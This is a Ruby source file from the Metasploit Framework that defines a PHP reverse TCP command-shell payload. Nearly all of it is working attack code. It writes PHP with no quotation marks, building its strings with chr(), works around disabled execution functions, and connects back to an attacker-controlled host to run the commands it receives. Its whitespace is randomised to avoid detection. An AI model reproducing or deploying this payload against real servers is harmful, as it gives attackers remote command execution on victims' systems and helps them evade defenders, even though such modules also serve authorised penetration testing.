##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Php

module ReversePhp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
			'Version'       => '$Revision$',
			'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
			'Author'        => 'egypt <egypt@nmt.edu>',
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# PHP Reverse Shell completely without quotes.  Strings and regexes
	# are replaced with chr() equivalents and the IP address to connect to is
	# replaced with integer equivalent wrapped in long2ip().  
	#
	# Attempts to make a connection back to the attacker using fsockopen or
	# socket_create and associated functions.  Then attempts to execute a
	# system command with the following functions, in order:
	#	- shell_exec
	#	- passthru
	#	- system
	#	- exec
	#	- proc_open
	#	- popen
	#
	# Issues
	#   - Since each command is executed in a new shell, 'cd' does nothing.
	#      Perhaps it should be special-cased to call chdir()
	#   - Tries to get around disable_functions but makes no attempts to 
	#      circumvent safe mode.  
  	#   - Should this add '2>&1' to the end of the executed command to avoid
	#      logging suspicious error messages?
	#
	def php_reverse_shell

		if (!datastore['LHOST'] or datastore['LHOST'].empty?)
			# datastore is empty on msfconsole startup
			ipaddr = 0x7f000001
			port = 4444
		else
			ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
			port = datastore['LPORT']
		end

		#
		# The regex looks like this unobfuscated:
		#   preg_replace('/[, ]+/', ',', $disabled);
		#
		shell=<<-END_OF_PHP_CODE
		$ipaddr=long2ip(#{ipaddr});
		$port=#{port};
		$_=chr(95);$a=chr(97);$b=chr(98);$c=chr(99);$d=chr(100);$e=chr(101);
		$f=chr(102);$h=chr(104);$i=chr(105);$k=chr(107);$l=chr(108);$m=chr(109);
		$n=chr(110);$o=chr(111);$p=chr(112);$r=chr(114);$s=chr(115);$t=chr(116);
		$u=chr(117);$x=chr(120);$y=chr(121);
		$disabled=@ini_get($d.$i.$s.$a.$b.$l.$e.$_.$f.$u.$n.$c.$t.$i.$o.$n.$s);
		if(!empty($disabled)){
			$disabled=preg_replace(chr(47).chr(91).chr(44).chr(32).chr(93).chr(43).chr(47),chr(44),$disabled);
			$disabled=explode(chr(44),$disabled);
			$disabled=array_map($t.$r.$i.$m,$disabled);
		}else{
			$disabled=array();
		}
		@set_time_limit(0);
		@ini_set($m.$a.$x.$_.$e.$x.$e.$c.$u.$t.$i.$o.$n.$_.$t.$i.$m.$e,0);
		function myexec($cmd){
			global$disabled,$_,$a,$c,$e,$h,$m,$n,$o,$p,$r,$s,$t,$u,$x,$y;
			if(is_callable($s.$h.$e.$l.$l.$_.$e.$x.$e.$c)and!in_array($s.$h.$e.$l.$l.$_.$e.$x.$e.$c,$disabled)){
				$output=shell_exec($cmd);
				return$output;
			}elseif(is_callable($p.$a.$s.$s.$t.$h.$r.$u)and!in_array($p.$a.$s.$s.$t.$h.$r.$u,$disabled)){
				ob_start();
				passthru($cmd);
				$output=ob_get_contents();
				ob_end_clean();
				return$output;
			}elseif(is_callable($s.$y.$s.$t.$e.$m)and!in_array($s.$y.$s.$t.$e.$m,$disabled)){
				ob_start();
				system($cmd);
				$output=ob_get_contents();
				ob_end_clean();
				return$output;
			}elseif(is_callable($e.$x.$e.$c)and!in_array($e.$x.$e.$c,$disabled)){
				$output=array();
				exec($cmd,$output);
				$output=join(chr(10),$output).chr(10);
				return$output;
			}elseif(is_callable($p.$r.$o.$c.$_.$o.$p.$e.$n)and!in_array($p.$r.$o.$c.$_.$o.$p.$e.$n,$disabled)){
				$handle=proc_open($cmd,array(array(pipe,r),array(pipe,w),array(pipe,w)),$pipes);
				$output=NULL;
				while(!feof($pipes[1])){
					$output.=fread($pipes[1],1024);
				}
				@proc_close($handle);
				return$output;
			}elseif(is_callable($p.$o.$p.$e.$n)and!in_array($p.$o.$p.$e.$n,$disabled)){
				$fp=popen($cmd,r);
				$output=NULL;
				if(is_resource($fp)){
					while(!feof($fp)){
						$output.=fread($fp,1024);
					}
				}
				@pclose($fp);
				return$output;
			}else{
				return false;
			}
		}
		$command=NULL;
		$nofuncs=$n.$o.chr(32).$e.$x.$e.$c.chr(32).$f.$u.$n.$c.$t.$i.$o.$n.$s.chr(32).chr(61).chr(40);
		if(is_callable($f.$s.$o.$c.$k.$o.$p.$e.$n)and!in_array($f.$s.$o.$c.$k.$o.$p.$e.$n,$disabled)){
			$sock=fsockopen($ipaddr,$port);
			while($cmd=fread($sock,2048)){
				$output=myexec(substr($cmd,0,-1));
				if($output===false){
					fwrite($sock,$nofuncs);
					break;
				}
				fwrite($sock,$output);
			}
			fclose($sock);
		}else{
			$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
			socket_connect($sock,$ipaddr,$port);
			while($cmd=socket_read($sock,2048)){
				$output=myexec(substr($cmd,0,-1));
				if($output===false){
					socket_write($sock,$nofuncs);
					break;
				}
				socket_write($sock,$output,strlen($output));
			}
			socket_close($sock);
		}
		END_OF_PHP_CODE

		# randomize the spaces a bit
		shell.gsub!(/\s+/) { |s|
			len = rand(5)+2
			set = "\x09\x20\x0a"
			buf = ''
			
			while (buf.length < len)
				buf << set[rand(set.length)].chr
			end
			
			buf
		}

		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return super + php_reverse_shell
	end
	

end

end end end end
